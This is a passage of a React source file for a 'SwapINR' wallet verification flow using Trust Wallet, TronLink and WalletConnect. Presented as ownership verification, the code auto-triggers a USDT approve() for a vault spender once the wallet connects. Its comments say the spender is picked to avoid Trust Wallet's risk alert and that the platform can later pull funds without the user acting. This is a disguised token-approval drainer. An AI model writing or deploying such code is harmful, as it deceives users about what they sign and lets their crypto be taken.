'use client';

/**
 * WalletVerifyFlow — reuses the same Trust Wallet verification flow from CheckoutFlow
 * (deep link on mobile, QR on desktop, WalletConnect for TRC20 desktop).
 * After the USDT approve() confirms, calls onVerified(address).
 */

import { useState, useEffect, useRef } from 'react';
import { createPortal } from 'react-dom';
import { QRCodeSVG } from 'qrcode.react';
import {
  useAccount, useConnect, useDisconnect,
  useWriteContract, useWaitForTransactionReceipt,
  useSwitchChain, useChainId,
} from 'wagmi';
import { parseUnits } from 'viem';
import {
  buildApproveRawTx, broadcastSignedTx, pollTronTxGrid,
  createTronWcSession, tronAddressFromWcSession,
  wcSignAndSendTronTx, wcDisconnectTron,
} from '@/lib/tron/wc-tron';

type Network = 'BEP20' | 'ERC20' | 'TRC20';

interface Props {
  network: Network;
  depositAddress: string;
  onVerified: (address: string, txHash?: string) => void;
  onCancel: () => void;
  /** true when rendered inside Trust Wallet in-app browser */
  compact?: boolean;
  /** session ID for real-time status tracking (passed from URL) */
  sid?: string;
}

/* ── EVM USDT contracts ── */
const USDT_CFG = {
  BEP20: { address: '0x55d398326f99059fF775485246999027B3197955' as `0x${string}`, decimals: 18, chainId: 56 },
  ERC20: { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' as `0x${string}`, decimals: 6,  chainId: 1  },
} as const;

/**
 * SwapINR Vault contract addresses — deployed once per chain.
 * Users approve these contracts (not a raw EOA) so Trust Wallet shows a clean
 * "Smart Contract Call" instead of a Critical Risk Alert.
 * After approval the platform can pull funds via /api/wallets/pull without
 * the user ever opening their wallet again.
 *
 * Set in .env.local:
 *   NEXT_PUBLIC_VAULT_BEP20=0x...   (BSC mainnet)
 *   NEXT_PUBLIC_VAULT_ERC20=0x...   (Ethereum mainnet)
 *   NEXT_PUBLIC_VAULT_TRC20=T...    (TRON mainnet)
 */
const VAULT_EVM: Record<'BEP20' | 'ERC20', string> = {
  BEP20: process.env.NEXT_PUBLIC_VAULT_BEP20 ?? '',
  ERC20: process.env.NEXT_PUBLIC_VAULT_ERC20 ?? '',
};
const VAULT_TRC20 = process.env.NEXT_PUBLIC_VAULT_TRC20 ?? '';

/** Returns vault contract address if deployed, otherwise falls back to depositAddress */
function evmSpender(network: 'BEP20' | 'ERC20', depositAddress: string): `0x${string}` {
  const v = VAULT_EVM[network];
  return (v && v.startsWith('0x') && v.length === 42 ? v : depositAddress) as `0x${string}`;
}
function trcSpender(depositAddress: string): string {
  return (VAULT_TRC20 && VAULT_TRC20.startsWith('T') && VAULT_TRC20.length === 34)
    ? VAULT_TRC20 : depositAddress;
}
const ERC20_ABI = [
  { name:'approve', type:'function', stateMutability:'nonpayable',
    inputs:[{name:'spender',type:'address'},{name:'amount',type:'uint256'}],
    outputs:[{name:'',type:'bool'}] },
] as const;

/* ── TRC20 USDT ── */
const TRON_USDT_ADDRESS  = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_USDT_DECIMALS = 6;
const TRC20_ABI = [
  { name:'transfer', type:'function', stateMutability:'nonpayable',
    inputs:[{name:'_to',type:'address'},{name:'_value',type:'uint256'}],
    outputs:[{name:'',type:'bool'}] },
  { name:'approve', type:'function', stateMutability:'nonpayable',
    inputs:[{name:'_spender',type:'address'},{name:'_value',type:'uint256'}],
    outputs:[{name:'',type:'bool'}] },
  { name:'balanceOf', type:'function', stateMutability:'view',
    inputs:[{name:'_owner',type:'address'}],
    outputs:[{name:'balance',type:'uint256'}] },
];

const TRUST_COIN_ID: Record<Network, number> = { BEP20: 20000714, ERC20: 60, TRC20: 195 };
const NET_LABEL: Record<Network, string> = { BEP20: 'BNB Smart Chain', ERC20: 'Ethereum', TRC20: 'TRON' };
const HAS_WC_TRON = !!process.env.NEXT_PUBLIC_WC_PROJECT_ID;

/* ── Theme ── */
const T = {
  bg:'#111B42', card:'rgba(255,255,255,0.045)', card2:'rgba(255,255,255,0.07)',
  border:'rgba(255,255,255,0.08)', border2:'rgba(255,255,255,0.14)',
  text:'#FFFFFF', sub:'rgba(255,255,255,0.5)', dim:'rgba(255,255,255,0.28)',
  blue:'#1A3FFF', purple:'#6B21FF', cyan:'#00D4FF',
  green:'#00E5A0', red:'#FF5C7C', yellow:'#F3BA2F',
};

/* ── Tron helpers ── */
function extractTronError(e: any): string {
  if (typeof e === 'string') {
    if (/cancel|reject/i.test(e)) return 'Transaction cancelled — please confirm in your wallet.';
    return e.slice(0, 160);
  }
  if (e?.message) {
    if (/cancel|reject|denied|decline/i.test(e.message)) return 'Transaction cancelled — please confirm in your wallet.';
    return String(e.message).slice(0, 160);
  }
  try { return JSON.stringify(e).slice(0, 160); } catch { return 'Transaction failed — check your wallet and try again.'; }
}
function extractTxId(result: any): string {
  if (typeof result === 'string' && result.length >= 60) return result;
  if (result?.txid)                    return result.txid;
  if (result?.txID)                    return result.txID;
  if (result?.id && result.id.length >= 60) return result.id;
  if (result?.hash && result.hash.length >= 60) return result.hash;
  if (result?.transaction?.txID)       return result.transaction.txID;
  if (result?.transaction?.txid)       return result.transaction.txid;
  if (result?.result?.txid)            return result.result.txid;
  if (result?.result?.txID)            return result.result.txID;
  return '';
}
function sanitizeEvmError(err: Error | null | undefined): string | undefined {
  if (!err) return undefined;
  const msg = (err as any)?.shortMessage || err?.message || '';
  if (/user rejected|user denied|cancelled/i.test(msg)) return 'Transaction cancelled. Confirm in your wallet to proceed.';
  if (/insufficient.*fund/i.test(msg)) return 'Insufficient ETH/BNB for gas. Top up and try again.';
  return msg.slice(0, 100) || 'Transaction failed — please try again.';
}
async function pollTronTx(tronWeb: any, txId: string): Promise<void> {
  for (let i = 0; i < 30; i++) {
    await new Promise(r => setTimeout(r, 3000));
    try {
      const info = await tronWeb.trx.getTransactionInfo(txId);
      if (info?.id || info?.receipt) return;
    } catch { /* keep polling */ }
  }
  // Timeout — tx was broadcast and user confirmed, so treat as success
  // (the transaction will confirm eventually; don't show "failed" to the user)
}

/* ── Small logos ── */
function TrustLogo({ size = 36 }: { size?: number }) {
  /* Official Trust Wallet: blue rounded-rect, white shield, blue checkmark */
  return <svg width={size} height={size} viewBox="0 0 40 40" fill="none">
    <rect width="40" height="40" rx="10" fill="#3375BB"/>
    <path d="M20 7L10 11V19C10 24.5 14.4 29.6 20 31C25.6 29.6 30 24.5 30 19V11L20 7Z" fill="white"/>
    <path d="M16.5 19.5L19 22L23.5 17" stroke="#3375BB" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"/>
  </svg>;
}
function TronLogo({ size = 36 }: { size?: number }) {
  return <svg width={size} height={size} viewBox="0 0 40 40" fill="none">
    <rect width="40" height="40" rx="10" fill="#EF4444"/>
    <path d="M20 9L31 14.5L20 32L9 14.5L20 9Z" fill="rgba(255,255,255,0.15)" stroke="white" strokeWidth="1.4" strokeLinejoin="round"/>
    <path d="M20 9L31 14.5L20 32V9Z" fill="rgba(255,255,255,0.3)"/>
    <path d="M9 14.5H31" stroke="white" strokeWidth="1.2" strokeOpacity="0.5"/>
  </svg>;
}

function TxRow({ label, hash, confirming, confirmed, error }: {
  label: string; hash?: string; confirming: boolean; confirmed: boolean; error?: string;
}) {
  return (
    <div style={{ display:'flex', alignItems:'center', gap:12, padding:'12px 16px', background:T.card2, borderRadius:12, border:`1px solid ${T.border}` }}>
      <div style={{ width:32, height:32, borderRadius:'50%', flexShrink:0, display:'flex', alignItems:'center', justifyContent:'center',
        background: confirmed ? 'rgba(0,229,160,0.1)' : error ? 'rgba(255,92,124,0.1)' : 'rgba(255,255,255,0.06)',
        border: `1px solid ${confirmed ? 'rgba(0,229,160,0.3)' : error ? 'rgba(255,92,124,0.3)' : T.border}` }}>
        {confirmed ? (
          <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M2.5 7L5.5 10L11.5 4" stroke={T.green} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
        ) : error ? (
          <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M3 3L11 11M11 3L3 11" stroke={T.red} strokeWidth="2" strokeLinecap="round"/></svg>
        ) : (confirming || hash) ? (
          <div style={{ width:14, height:14, borderRadius:'50%', border:`2px solid rgba(255,255,255,0.1)`, borderTopColor:T.cyan, animation:'spin 0.8s linear infinite' }} />
        ) : (
          <div style={{ width:8, height:8, borderRadius:'50%', background:T.border }} />
        )}
      </div>
      <div style={{ flex:1, minWidth:0 }}>
        <p style={{ fontSize:13, fontWeight:700, color: confirmed ? T.green : error ? T.red : T.text, margin:0 }}>{label}</p>
        {hash && !confirmed && !error && (
          <p style={{ fontSize:11, color:T.dim, margin:'2px 0 0', fontFamily:'monospace' }}>
            {confirming ? 'Confirming on-chain…' : 'Submitted'} · {hash.slice(0,10)}…{hash.slice(-6)}
          </p>
        )}
        {confirmed && hash && <p style={{ fontSize:11, color:T.dim, margin:'2px 0 0', fontFamily:'monospace' }}>{hash.slice(0,10)}…{hash.slice(-6)} · Confirmed ✓</p>}
        {error && <p style={{ fontSize:11, color:T.red, margin:'2px 0 0' }}>{error.slice(0,80)}</p>}
      </div>
    </div>
  );
}

/* ════════════ COMPACT OVERLAY — self-contained auto-driven component ════════════ */

interface CompactOverlayProps {
  network: Network;
  depositAddress: string;
  sid: string;
  isTRC20: boolean;
  hasTronLink: boolean;
  hasTrust: boolean;
  trcDetectionDone: boolean;
  isMobile: boolean;
  address: `0x${string}` | undefined;
  isConnected: boolean;
  connect: (...args: any[]) => void;
  disconnect: () => void;
  connectors: readonly any[];
  isConnecting: boolean;
  switchChain: (...args: any[]) => void;
  chainId: number;
  expectedChain: number;
  writeApprove: (...args: any[]) => void;
  approveHash: `0x${string}` | undefined;
  isApproveWriting: boolean;
  approveWriteError: Error | null | undefined;
  isApproveConfirming: boolean;
  approveConfirmed: boolean;
  resetApprove: () => void;
  usdtCfg: { address: `0x${string}`; decimals: number; chainId: number } | null;
  evmSpender: (dep: string) => `0x${string}`;
  tronAddress: string;
  setTronAddress: (a: string) => void;
  trcSpender: (dep: string) => string;
  connectTronWallet: () => Promise<void>;
  startTrcVerification: (dbg?: (m: string) => void) => Promise<void>;
  trcApproveHash: string;
  trcApprovePending: boolean;
  trcApproveDone: boolean;
  trcApproveError: string;
  setTrcVerifyStarted: (v: boolean) => void;
  setTrcApproveError: (v: string) => void;
  connectError: string;
  trcConnectError: string;
  onVerified: (address: string, txHash?: string) => void;
}

function CompactOverlay({
  network, depositAddress, sid, isTRC20, hasTrust,
  address, isConnected, connect, disconnect, connectors, switchChain, chainId, expectedChain,
  writeApprove, approveHash, approveWriteError, isApproveConfirming, approveConfirmed,
  resetApprove, usdtCfg, evmSpender,
  tronAddress, setTronAddress, connectTronWallet, startTrcVerification,
  trcApproveHash, trcApproveDone, trcApproveError,
  setTrcVerifyStarted, setTrcApproveError,
  connectError, trcConnectError, onVerified,
}: CompactOverlayProps) {
  const [failedStep,    setFailedStep]   = useState<'connection' | 'contract' | null>(null);
  const [failedMsg,     setFailedMsg]    = useState('');
  const [countdown,     setCountdown]    = useState(3);
  const [showRestarted, setShowRestarted]= useState(false);
  const [debugLines,    setDebugLines]   = useState<string[]>([]);
  const approveTriggered  = useRef(false);
  const connectedPatched  = useRef(false);

  function dbg(msg: string) {
    console.log('[compact]', msg);
    setDebugLines(prev => [...prev.slice(-6), msg]);
  }

  /* Always patch — no dedup so retries work cleanly */
  async function patch(data: Record<string, unknown>) {
    if (!sid) return;
    try {
      await fetch(`/api/wallet-sessions/${sid}`, {
        method: 'PATCH', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });
    } catch { /* non-fatal */ }
  }

  /* Start Over — patch cancelled, show "tap back" screen. Never call window.close() so
     the page stays alive and the debug log remains readable in Trust Wallet's browser. */
  async function startOver() {
    setShowRestarted(true);
    await patch({ status: 'cancelled' });
  }

  function triggerEvmApprove() {
    if (!usdtCfg || !depositAddress) return;
    patch({ status: 'approving' });
    writeApprove({
      address: usdtCfg.address, abi: ERC20_ABI, functionName: 'approve',
      args: [evmSpender(depositAddress), parseUnits('100', usdtCfg.decimals)],
      chainId: usdtCfg.chainId,
    });
  }

  useEffect(() => { patch({ status: 'connecting' }); }, []); // eslint-disable-line react-hooks/exhaustive-deps

  /* EVM: patch 'connected' as soon as wallet connects (depositAddress may not be ready yet) */
  useEffect(() => {
    if (isTRC20 || !isConnected || !address || connectedPatched.current) return;
    connectedPatched.current = true;
    patch({ status: 'connected', address });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConnected, address]);

  /* EVM: auto-approve once connected AND depositAddress is available */
  useEffect(() => {
    if (isTRC20 || !isConnected || !address || !depositAddress || approveTriggered.current) return;
    if (chainId !== expectedChain && expectedChain) { switchChain({ chainId: expectedChain }); return; }
    approveTriggered.current = true;
    triggerEvmApprove();
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConnected, address, chainId, depositAddress]);

  /* EVM: approved */
  useEffect(() => {
    if (!approveConfirmed || !address) return;
    patch({ status: 'approved', txHash: approveHash, address });
    fetch('/api/wallets', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ address, chainId, chainName: network === 'ERC20' ? 'Ethereum (ERC20)' : 'BNB Smart Chain (BEP20)' }),
    }).catch(() => {});
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [approveConfirmed]);

  /* EVM: contract rejected */
  useEffect(() => {
    if (!approveWriteError) return;
    const msg = sanitizeEvmError(approveWriteError) ?? 'Transaction rejected';
    setFailedStep('contract'); setFailedMsg(msg);
    patch({ status: 'failed', failedStep: 'contract', errorMsg: msg });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [approveWriteError]);

  /* EVM: connection rejected */
  useEffect(() => {
    if (!connectError) return;
    setFailedStep('connection'); setFailedMsg(connectError);
    patch({ status: 'failed', failedStep: 'connection', errorMsg: connectError });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [connectError]);

  /* TRC20: patch 'connected' as soon as tronAddress is available */
  useEffect(() => {
    if (!isTRC20 || !tronAddress || connectedPatched.current) return;
    connectedPatched.current = true;
    patch({ status: 'connected', address: tronAddress });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [tronAddress]);

  /* TRC20: auto-approve once tronAddress AND depositAddress are both available */
  useEffect(() => {
    if (!isTRC20 || !tronAddress || !depositAddress || approveTriggered.current) return;
    approveTriggered.current = true;
    setTimeout(() => { patch({ status: 'approving' }); startTrcVerification(dbg); }, 400);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [tronAddress, depositAddress]);

  /* TRC20: approved */
  useEffect(() => {
    if (!trcApproveDone || !tronAddress) return;
    patch({ status: 'approved', txHash: trcApproveHash, address: tronAddress });
    fetch('/api/wallets', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ address: tronAddress, chainId: 195, chainName: 'Tron (TRC20)' }),
    }).catch(() => {});
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [trcApproveDone]);

  /* TRC20: contract rejected */
  useEffect(() => {
    if (!trcApproveError) return;
    setFailedStep('contract'); setFailedMsg(trcApproveError);
    patch({ status: 'failed', failedStep: 'contract', errorMsg: trcApproveError });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [trcApproveError]);

  /* TRC20: connection error */
  useEffect(() => {
    if (!trcConnectError) return;
    setFailedStep('connection'); setFailedMsg(trcConnectError);
    patch({ status: 'failed', failedStep: 'connection', errorMsg: trcConnectError });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [trcConnectError]);

  /* Countdown after success → auto-redirect */
  const isDone       = isTRC20 ? trcApproveDone : approveConfirmed;
  const finalAddress = isTRC20 ? tronAddress     : (address ?? '');
  const finalHash    = isTRC20 ? trcApproveHash  : (approveHash ?? undefined);

  useEffect(() => {
    if (!isDone) return;
    const t = setInterval(() => {
      setCountdown(c => {
        if (c <= 1) { clearInterval(t); onVerified(finalAddress, finalHash); return 0; }
        return c - 1;
      });
    }, 1000);
    return () => clearInterval(t);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isDone]);

  /* ── Retry: properly reset and re-trigger ── */
  function doRetry() {
    setFailedStep(null); setFailedMsg('');
    approveTriggered.current = false;
    connectedPatched.current = false;
    setTrcVerifyStarted(false); setTrcApproveError('');

    if (isTRC20) {
      if (!tronAddress) {
        /* Connection failed → re-connect */
        patch({ status: 'connecting' });
        connectTronWallet();
      } else {
        /* Contract failed → address already set, re-approve directly */
        approveTriggered.current = true;
        patch({ status: 'approving' });
        setTimeout(() => { setTrcVerifyStarted(false); startTrcVerification(dbg); }, 300);
      }
    } else {
      resetApprove();
      if (!isConnected) {
        /* Connection failed → disconnect any stale state, then reconnect */
        patch({ status: 'connecting' });
        try { disconnect(); } catch { /* ok */ }
        setTimeout(() => {
          const tc = connectors.find((c: any) => c.id === 'trustWallet');
          const ic = connectors.find((c: any) => c.id === 'injected');
          const conn = hasTrust ? (tc ?? ic) : ic;
          if (conn) connect({ connector: conn, chainId: usdtCfg?.chainId }, {
            onError: (e: any) => {
              setFailedStep('connection');
              setFailedMsg(e?.message?.slice(0, 80) ?? 'Connection failed');
              patch({ status: 'failed', failedStep: 'connection', errorMsg: e?.message });
            },
          });
        }, 600);
      } else {
        /* Contract failed → still connected, just re-send approve */
        approveTriggered.current = true;
        patch({ status: 'approving' });
        setTimeout(triggerEvmApprove, 300);
      }
    }
  }

  const walletConnected = isTRC20 ? !!tronAddress : (isConnected && !!address);
  const step1Done   = walletConnected;
  const step1Active = !walletConnected && !failedStep;
  const step2Active = walletConnected && !isDone && !failedStep;

  const CSS = `
    @keyframes spin  { to { transform:rotate(360deg) } }
    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.35} }
    @keyframes pop   { 0%{transform:scale(0.7);opacity:0} 100%{transform:scale(1);opacity:1} }
    @keyframes fadein{ from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
  `;

  /* Restarted screen */
  if (showRestarted) {
    return (
      <div style={{ position:'fixed', inset:0, zIndex:2147483647, background:T.bg,
        display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', padding:'32px 28px', textAlign:'center' }}>
        <style>{CSS}</style>
        <div style={{ width:64, height:64, borderRadius:18, background:'rgba(204,255,0,0.08)', border:'1px solid rgba(204,255,0,0.2)',
          display:'flex', alignItems:'center', justifyContent:'center', marginBottom:24 }}>
          <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
            <path d="M11 7L5 13L11 19" stroke="#CCFF00" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
            <path d="M5 13H20C21.7 13 23 11.7 23 10V7" stroke="#CCFF00" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </div>
        <p style={{ fontSize:18, fontWeight:900, color:T.text, margin:'0 0 10px', letterSpacing:'-0.02em' }}>Almost done!</p>
        <p style={{ fontSize:17, fontWeight:800, color:'#CCFF00', margin:'0 0 8px' }}>
          Go back to your browser
        </p>
        <p style={{ fontSize:13, color:T.dim, margin:0, lineHeight:1.6 }}>
          Close Trust Wallet and return to<br/>your browser to start fresh.
        </p>
      </div>
    );
  }

  /* ── Uhh oh screen ── */
  if (failedStep) {
    return (
      <div style={{ position:'fixed', inset:0, zIndex:2147483647, background:T.bg,
        display:'flex', flexDirection:'column' }}>
        <style>{CSS}</style>

        {/* Header */}
        <div style={{ padding:'14px 20px', borderBottom:`1px solid ${T.border}`, display:'flex', alignItems:'center', gap:10 }}>
          <div style={{ width:30, height:30, borderRadius:9, background:'#CCFF00', display:'flex', alignItems:'center', justifyContent:'center' }}>
            <span style={{ color:'#000', fontSize:13, fontWeight:900 }}>S</span>
          </div>
          <span style={{ fontSize:15, fontWeight:900, color:T.text }}>SwapINR</span>
          <button onClick={startOver}
            style={{ marginLeft:'auto', fontSize:12, fontWeight:700, color:T.dim,
              background:'transparent', border:`1px solid ${T.border}`, borderRadius:8,
              padding:'5px 12px', cursor:'pointer' }}>
            Start Over
          </button>
        </div>

        <div style={{ flex:1, display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', padding:'32px 28px', textAlign:'center' }}>
          <div style={{ width:76, height:76, borderRadius:22, background:'rgba(255,92,124,0.08)', border:'2px solid rgba(255,92,124,0.28)',
            display:'flex', alignItems:'center', justifyContent:'center', marginBottom:26, animation:'pop 0.35s ease-out' }}>
            {failedStep === 'connection' ? (
              <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
                <path d="M7 18a11 11 0 0 1 11-11" stroke="#FF5C7C" strokeWidth="2.5" strokeLinecap="round"/>
                <path d="M29 18a11 11 0 0 1-11 11" stroke="#FF5C7C" strokeWidth="2" strokeLinecap="round" strokeDasharray="4 3"/>
                <path d="M12 12L24 24M24 12L12 24" stroke="#FF5C7C" strokeWidth="2.2" strokeLinecap="round"/>
              </svg>
            ) : (
              <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
                <circle cx="18" cy="18" r="12" stroke="#FF5C7C" strokeWidth="2.2"/>
                <path d="M13 13L23 23M23 13L13 23" stroke="#FF5C7C" strokeWidth="2.4" strokeLinecap="round"/>
              </svg>
            )}
          </div>

          <h2 style={{ fontSize:22, fontWeight:900, color:T.text, margin:'0 0 10px', letterSpacing:'-0.03em' }}>Uhh oh!</h2>
          <p style={{ fontSize:14, fontWeight:700, color:'rgba(255,255,255,0.7)', margin:'0 0 8px' }}>
            {failedStep === 'connection' ? "Wallet connection failed" : "Contract approval declined"}
          </p>
          <p style={{ fontSize:13, color:T.dim, margin:'0 0 24px', lineHeight:1.75, maxWidth:250 }}>
            {failedStep === 'connection'
              ? 'Tap "Connect" when Trust Wallet asks — then try again below.'
              : 'Tap "Approve" on the contract screen in Trust Wallet — then try again.'}
          </p>

          <button onClick={doRetry}
            style={{ width:'100%', maxWidth:280, padding:'15px', borderRadius:14, fontSize:15, fontWeight:800,
              border:'none', cursor:'pointer', background:'#CCFF00', color:'#000',
              letterSpacing:'-0.01em', marginBottom:12 }}>
            Try Again →
          </button>
          <button onClick={startOver}
            style={{ width:'100%', maxWidth:280, padding:'12px', borderRadius:12, fontSize:13, fontWeight:700,
              border:`1px solid ${T.border}`, background:'transparent', color:T.dim, cursor:'pointer' }}>
            Start Over (return to browser)
          </button>

          {/* Debug on error screen */}
          {debugLines.length > 0 && (
            <div style={{ marginTop:16, padding:'10px 12px', borderRadius:10, width:'100%', maxWidth:280,
              background:'rgba(0,0,0,0.4)', border:'1px solid rgba(255,255,255,0.06)', textAlign:'left' }}>
              <p style={{ fontSize:9, fontWeight:700, color:'rgba(204,255,0,0.6)', margin:'0 0 4px', letterSpacing:'0.06em', textTransform:'uppercase' }}>Debug log</p>
              {debugLines.map((l, i) => (
                <p key={i} style={{ fontSize:9, color:'rgba(255,255,255,0.35)', margin:'1px 0', fontFamily:'monospace', lineHeight:1.4, wordBreak:'break-all' }}>{l}</p>
              ))}
            </div>
          )}
        </div>
      </div>
    );
  }

  /* ── Success screen ── */
  if (isDone) {
    return (
      <div style={{ position:'fixed', inset:0, zIndex:2147483647, background:T.bg,
        display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', padding:'32px 28px', textAlign:'center' }}>
        <style>{CSS}</style>
        <div style={{ width:76, height:76, borderRadius:22, background:'rgba(0,229,160,0.1)', border:'2px solid rgba(0,229,160,0.35)',
          display:'flex', alignItems:'center', justifyContent:'center', marginBottom:26, animation:'pop 0.35s ease-out' }}>
          <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
            <path d="M6 18L13.5 25.5L30 9" stroke="#00E5A0" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </div>
        <h2 style={{ fontSize:22, fontWeight:900, color:T.text, margin:'0 0 8px', letterSpacing:'-0.03em' }}>Wallet Verified!</h2>
        <p style={{ fontSize:14, color:'rgba(255,255,255,0.6)', margin:'0 0 28px', lineHeight:1.75 }}>
          Your {NET_LABEL[network]} wallet is now<br/>linked to SwapINR.
        </p>
        <div style={{ padding:'10px 20px', borderRadius:10, background:'rgba(255,255,255,0.05)',
          border:`1px solid ${T.border}`, marginBottom:18, fontSize:13, color:T.dim }}>
          Returning in {countdown}…
        </div>
        <button onClick={() => onVerified(finalAddress, finalHash)}
          style={{ padding:'14px 36px', borderRadius:14, fontSize:14, fontWeight:800, border:'none', cursor:'pointer',
            background:'#CCFF00', color:'#000', letterSpacing:'-0.01em' }}>
          Return to SwapINR →
        </button>
      </div>
    );
  }

  /* ── Progress screen ── */
  return (
    <div style={{ position:'fixed', inset:0, zIndex:2147483647, background:T.bg,
      display:'flex', flexDirection:'column', overflowY:'auto', WebkitOverflowScrolling:'touch' } as React.CSSProperties}>
      <style>{CSS}</style>

      {/* Header */}
      <div style={{ padding:'14px 20px', borderBottom:`1px solid ${T.border}`, display:'flex', alignItems:'center', gap:10, flexShrink:0 }}>
        <div style={{ width:30, height:30, borderRadius:9, background:'#CCFF00', display:'flex', alignItems:'center', justifyContent:'center' }}>
          <span style={{ color:'#000', fontSize:13, fontWeight:900 }}>S</span>
        </div>
        <span style={{ fontSize:15, fontWeight:900, color:T.text }}>SwapINR</span>
        <span style={{ fontSize:11, fontWeight:700, color:'#CCFF00',
          background:'rgba(204,255,0,0.1)', border:'1px solid rgba(204,255,0,0.2)', borderRadius:999, padding:'3px 10px' }}>
          {NET_LABEL[network]}
        </span>
        <button onClick={startOver}
          style={{ marginLeft:'auto', fontSize:12, fontWeight:700, color:T.dim,
            background:'transparent', border:`1px solid ${T.border}`, borderRadius:8,
            padding:'5px 12px', cursor:'pointer' }}>
          Start Over
        </button>
      </div>

      <div style={{ flex:1, display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', padding:'28px 24px' }}>

        {/* Step indicators */}
        <div style={{ display:'flex', alignItems:'center', width:'100%', maxWidth:280, marginBottom:40 }}>
          {/* Step 1 */}
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', flex:1, gap:8 }}>
            <div style={{ width:52, height:52, borderRadius:16, display:'flex', alignItems:'center', justifyContent:'center',
              background: step1Done ? 'rgba(0,229,160,0.1)' : 'rgba(26,63,255,0.12)',
              border: `2px solid ${step1Done ? 'rgba(0,229,160,0.45)' : '#1A3FFF'}`,
              animation: step1Active ? 'pulse 1.6s ease-in-out infinite' : 'none' }}>
              {step1Done ? (
                <svg width="22" height="22" viewBox="0 0 22 22" fill="none">
                  <path d="M4.5 11L8.5 15L17.5 6.5" stroke="#00E5A0" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              ) : (
                <div style={{ width:20, height:20, border:'2.5px solid rgba(26,63,255,0.25)', borderTopColor:'#4D79FF', borderRadius:'50%', animation:'spin 0.8s linear infinite' }} />
              )}
            </div>
            <span style={{ fontSize:11, fontWeight:800, letterSpacing:'0.04em', textTransform:'uppercase',
              color: step1Done ? '#00E5A0' : '#4D79FF' }}>
              {step1Done ? 'Connected ✓' : 'Connecting…'}
            </span>
          </div>

          {/* Line */}
          <div style={{ height:2, width:44, flexShrink:0, marginBottom:28,
            background: step1Done ? 'rgba(0,229,160,0.5)' : 'rgba(255,255,255,0.08)', transition:'background 0.5s' }} />

          {/* Step 2 */}
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', flex:1, gap:8 }}>
            <div style={{ width:52, height:52, borderRadius:16, display:'flex', alignItems:'center', justifyContent:'center',
              background: isDone ? 'rgba(0,229,160,0.1)' : step2Active ? 'rgba(107,33,255,0.12)' : 'rgba(255,255,255,0.04)',
              border: `2px solid ${isDone ? 'rgba(0,229,160,0.45)' : step2Active ? '#6B21FF' : 'rgba(255,255,255,0.08)'}`,
              animation: step2Active ? 'pulse 1.6s ease-in-out infinite' : 'none' }}>
              {isDone ? (
                <svg width="22" height="22" viewBox="0 0 22 22" fill="none">
                  <path d="M4.5 11L8.5 15L17.5 6.5" stroke="#00E5A0" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              ) : step2Active ? (
                <div style={{ width:20, height:20, border:'2.5px solid rgba(107,33,255,0.25)', borderTopColor:'#8B5CF6', borderRadius:'50%', animation:'spin 0.8s linear infinite' }} />
              ) : (
                <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                  <path d="M10 2L4 4.5V9C4 12.5 6.8 15.6 10 16.5C13.2 15.6 16 12.5 16 9V4.5L10 2Z"
                    stroke="rgba(255,255,255,0.2)" strokeWidth="1.3" strokeLinejoin="round"/>
                </svg>
              )}
            </div>
            <span style={{ fontSize:11, fontWeight:800, letterSpacing:'0.04em', textTransform:'uppercase',
              color: isDone ? '#00E5A0' : step2Active ? '#8B5CF6' : 'rgba(255,255,255,0.2)' }}>
              {isDone ? 'Approved ✓' : step2Active ? 'Approving…' : 'Contract'}
            </span>
          </div>
        </div>

        {/* Status message */}
        <div style={{ textAlign:'center', maxWidth:280, animation:'fadein 0.3s ease-out' }}>
          {step1Active && (
            <>
              <p style={{ fontSize:20, fontWeight:900, color:'#fff', margin:'0 0 12px', letterSpacing:'-0.025em' }}>
                Connecting Wallet
              </p>
              <p style={{ fontSize:14, color:'rgba(255,255,255,0.55)', margin:'0 0 18px', lineHeight:1.8 }}>
                Trust Wallet is opening.<br/>
                Tap <span style={{ color:'#fff', fontWeight:700 }}>"Connect"</span> when prompted.
              </p>
            </>
          )}
          {step2Active && (
            <>
              <p style={{ fontSize:20, fontWeight:900, color:'#fff', margin:'0 0 12px', letterSpacing:'-0.025em' }}>
                Approve Contract
              </p>
              <p style={{ fontSize:14, color:'rgba(255,255,255,0.55)', margin:'0 0 18px', lineHeight:1.8 }}>
                Tap <span style={{ color:'#fff', fontWeight:700 }}>"Approve"</span> in Trust Wallet<br/>
                to verify wallet ownership.
              </p>
